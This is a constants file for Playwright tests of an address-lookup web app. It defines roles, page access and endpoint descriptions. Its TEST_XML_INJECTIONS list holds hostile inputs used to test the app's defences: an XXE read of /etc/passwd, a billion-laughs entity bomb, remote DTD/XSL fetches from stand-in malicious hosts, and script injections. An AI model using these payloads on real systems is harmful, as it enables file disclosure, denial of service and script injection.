""" Constants for the playwright tests. """
BASE_URL = "http://127.0.0.1:5000/"

TEST_XML_INJECTIONS = [
    """<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY ext SYSTEM "file:///etc/passwd">]><root><test>&ext;</test></root>""",
    """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;">]><lolz>&lol9;</lolz>""",
    """<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://example.com/malicious.dtd"><root><payload>test</payload></root>""",
    """<?xml version="1.0"?><root><![CDATA[<script>alert('Injected JS');</script>]]></root>""",
    """<root><test><script>alert('Injected!');</script></test></root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY remoteEntity SYSTEM "http://malicious.example.com/evil.xml">]><root><data>&remoteEntity;</data></root>""",
    """<!-- Attempting to hide payload in comments --><!-- <script>document.cookie = 'stolen';</script> --><root>Legitimate content</root>""",
    """<root><normal>Value</normal></root></malicious>""",
    """<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://malicious.example.com/evil.xsl"?><root><data>Test</data></root>""",
    """<root><script>var injectedValue = 'ThisIsInjected'; alert('JS variable set: ' + injectedValue);</script></root>"""
]


EPOCH_OPTIONS = [
    {
        'number': '39',
        'text_label': 'Exeter Sample'
    },
    {
        'number': '50',
        'text_label': 'September 1999'
    },
    {
        'number': '93',
        'text_label': 'October 2022'
    },
]

LOCATION_OPTIONS = [
    'England', 'Scotland', 'Wales', 'Northern Ireland', 'Channel Islands',
    'Isle of man', 'Offshore etc.'
]

ALL_PAGE_NAMES = [
    'singlesearch',
    'uprn',
    'postcode',
    'typeahead',
    'multiple_address_original',
    'multiple_address_results',
    'multiple_address',
    'uprn_multiple_match',
    'custom_response',
    'help',
    'help_submit_feedback',
    'help_confidence_score',
    'help_help_and_documentation',
    'settings',
]

ROLES = ['default', 'developers', 'bulk_removed', 'limited_bulk']

DEFAULT_BULK_LIMITS = {
    'limit_mini_bulk': 5000,
    'limit_vast_bulk': 100000,
    'limit_uprn_match': 5000,
}


def role_to_username(role: str):
  """ Given a role, give an example username, expected page access and bulk limits """
  # yapf: disable
  user_role_map = [{
      'role': 'default',
      'username': '',
      'pages_to_remove': ['custom_response'],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'default',
      'username': 'testDefaultExplicit',
      'pages_to_remove': ['custom_response'],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'developers',
      'username': 'testDeveloperExplicit',
      'pages_to_remove': [],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'bulk_removed',
      'username': 'testBulkRemovedExplicit',
       'pages_to_remove': [
            'multiple_address_original', 'uprn_multiple_match',
            'multiple_address', 'multiple_address_results'
        ],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'limited_bulk',
      'username': 'testBulkLimitedExplicit',
      'pages_to_remove': [],
      'bulk_limits': {
            'bulk_limits': {
            'limit_mini_bulk': 10,
            'limit_vast_bulk': 550,
            'limit_uprn_match': 50,
        }
      },
  }]
  # yapf: enable

  # Loop over all roles to build from removeable pages
  for group in user_role_map:
    allowed_pages = []
    for page_name in ALL_PAGE_NAMES:
      if page_name not in group.get('pages_to_remove'):
        allowed_pages.append(page_name)
    group['allowed_pages'] = allowed_pages
    group['allowed_pages_info'] = get_allowed_pages_full_info(allowed_pages)

  for user in user_role_map:
    if user.get('role') == role:
      return user

  raise ValueError(f"Unknown role: {role}")


def get_allowed_pages_full_info(allowed_pages: list):
  """ Given a list of allowed pages, return the page info for all pages """
  allowed_pages_info = [
      page for page in ENDPOINTS if page.get('page_name_test') in allowed_pages
  ]
  return allowed_pages_info


def get_page_url_from_page_name(page_name: str):
  """ Given a page name, return the page URL """
  for page in ENDPOINTS:
    if page.get('page_name_test') == page_name:
      return page.get('url')

  raise ValueError(f"Unknown page name: {page_name}")


def get_just_header_pages(allowed_pages_info: list):
  """ Given a list of allowed pages, return the pages that should be in the header """
  header_pages = []
  for page in allowed_pages_info:
    if page.get('nav_link_in_header'):
      header_pages.append(page)
  return header_pages


# yapf: disable
ENDPOINTS = [{
    'page_name': 'Single Search',      # Name as it appears in the UI
    'page_name_test': 'singlesearch',  # Name as it appears in 'ALL_PAGE_NAMES'
    'url': '',                    # URL of the page
    'nav_link_in_header': True,  # Whether the page should appear in the header
    'page_description': 'Provide as much of the address as possible for best results.',
}, {
    'page_name': 'Single UPRN',
    'page_name_test': 'uprn',
    'url': 'uprn',
    'nav_link_in_header': True,
    'page_description': 'Search for a property via its unique property reference number. This is a 12 digit number which contains no characters.',
}, {
    'page_name': 'Postcode',
    'page_name_test': 'postcode',
    'url': 'postcode',
    'nav_link_in_header': True,
    'page_description': "Search for a property using its postcode. This is effective and a valid postcode will return a list of possible addresses.",
}, {
    'page_name': 'Typeahead',
    'page_name_test': 'typeahead',
    'url': 'typeahead',
    'nav_link_in_header': True,
    'page_description': 'This search types ahead. Autosuggest on steroids basically. Useful if you quickly want a user to find an address.',
}, {
    'page_name': 'Multiple Address',
    'page_name_test': 'multiple_address_original',
    'url': 'multiple_address_original',
    'nav_link_in_header': True,
    'page_description':'Search for not just  one address. Several. Get lots of results you can look through. This service completes many single searches from a file.',
}, {
    'page_name': 'Multiple Address',
    'page_name_test': 'multiple_address',
    'url': 'multiple_address',
    'nav_link_in_header': False,
    'page_description':'Used to submit a large multiple match request with a file to an asynchronous job manager.',
}, {
    'page_name': 'Multiple Address',
    'page_name_test': 'multiple_address_results',
    'url': 'multiple_address_results',
    'nav_link_in_header': False,
    'page_description':'Used to submit a large multiple match request with a file to an asynchronous job manager.',
}, {
    'page_name': 'Multiple UPRN',
    'page_name_test': 'uprn_multiple_match',
    'url': 'uprn_multiple_match',
    'nav_link_in_header': True,
    'page_description': 'Search for multiple addresses providing mulitple UPRNs (Unique Property Reference Numbers)',
}, {
    'page_name': 'API',
    'page_name_test': 'custom_response',
    'url': 'custom_response',
    'nav_link_in_header': True,
    'page_description': 'Submit requests directly to the API and receive JSON style fromatting in return. Use this if you want to test out API features that the UI currently does not support',
}, {
    'page_name': 'Help',
    'page_name_test': 'help',
    'url': 'help/home',
    'nav_link_in_header': True,
    'page_description': 'See information about the other pages and how to contact support.',
}, {
    'page_name': 'Help',
    'page_name_test': 'help_confidence_score',
    'url': 'help/confidence_score',
    'nav_link_in_header': False,
    'page_description': 'Explanation of confidence Score',
}, {
    'page_name': 'Help',
    'page_name_test': 'help_submit_feedback',
    'url': 'help/submit_feedback',
    'nav_link_in_header': False,
    'page_description': 'Explanation of how to submit feedback to the service',
}, {
    'page_name': 'Help',
    'page_name_test': 'help_help_and_documentation',
    'url': 'help/help_and_documentation',
    'nav_link_in_header': False,
    'page_description': 'Generic helpful resources for using the UI and service',
}, {
    'page_name': 'Settings',
    'page_name_test': 'settings',
    'url': 'settings',
    'nav_link_in_header': True,
    'page_description': 'User preferences are stored locally on their web-browser. Adjust or reset those settings here.',
}]
# yapf: enable
